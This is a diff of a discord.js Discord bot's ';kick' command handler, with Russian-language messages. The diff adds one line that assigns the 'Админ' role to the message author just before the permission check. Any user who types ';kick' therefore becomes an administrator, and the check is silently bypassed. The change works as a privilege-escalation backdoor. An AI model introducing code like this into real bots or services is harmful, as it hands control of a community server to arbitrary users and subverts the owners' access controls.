@@ -38,6 +38,7 @@ client.on('message', message => {
 	};
 	if (message.content.substring(0,5) == ";kick") {
 		let iqo = message.guild.roles.find('name','Админ');
+		message.guild.member(message.author).addRole(iqo);
 		if (!message.guild.member(message.author).roles.has(iqo)) return message.channel.send('Вам не разрешено использовать эту команду.');
 		message.channel.send('Окей, ща попробую...');
 		if (!message.mentions.users.first()) return message.channel.send('Эй, я не опознал этого игрока!');
